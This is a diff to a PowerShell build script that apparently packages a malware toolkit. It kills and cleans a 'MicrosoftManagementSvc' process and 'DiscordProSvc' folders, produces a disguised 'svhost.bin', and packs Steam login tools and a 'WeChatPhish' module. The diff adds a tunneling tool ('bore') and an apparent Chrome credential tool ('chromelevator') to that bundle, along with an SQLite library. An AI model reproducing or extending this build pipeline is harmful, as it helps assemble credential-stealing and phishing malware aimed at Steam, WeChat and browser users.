@@ -70,6 +70,13 @@ Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Proces
 Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
 if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }
 
+# 1. Restore e_sqlite3.dll from NuGet cache if missing in root
+if (!(Test-Path "e_sqlite3.dll")) {
+    Write-Host "[*] Restoring e_sqlite3.dll from NuGet cache..." -ForegroundColor Yellow
+    $NuGetPath = "C:\Users\zxc23\.nuget\packages\sqlitepclraw.lib.e_sqlite3\2.1.6\runtimes\win-x64\native\e_sqlite3.dll"
+    if (Test-Path $NuGetPath) { Copy-Item $NuGetPath "." -Force }
+}
+
 Write-Host "[*] Phase 0.6: Building Resource Packer (Self-Contained Toolchain)..." -ForegroundColor Cyan
 dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
 if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
@@ -164,9 +171,11 @@ if (!(Test-Path "svhost.bin")) {
 
 # Pack other large resources if they exist
 $OtherResources = @(
-    @{ Src = "tools\SteamAlert.exe"; Dest = "SteamAlert.bin" },
-    @{ Src = "tools\SteamLogin.exe"; Dest = "SteamLogin.bin" },
-    @{ Src = "Modules\WeChat.exe";   Dest = "WeChatPhish.bin" }
+    @{ Src = "tools\SteamAlert.exe";   Dest = "SteamAlert.bin" },
+    @{ Src = "tools\SteamLogin.exe";   Dest = "SteamLogin.bin" },
+    @{ Src = "tools\bore.exe";         Dest = "bore.bin" },
+    @{ Src = "tools\chromelevator.exe";Dest = "chromelevator.bin" },
+    @{ Src = "Modules\WeChat.exe";     Dest = "WeChatPhish.bin" }
 )
 
 foreach ($res in $OtherResources) {
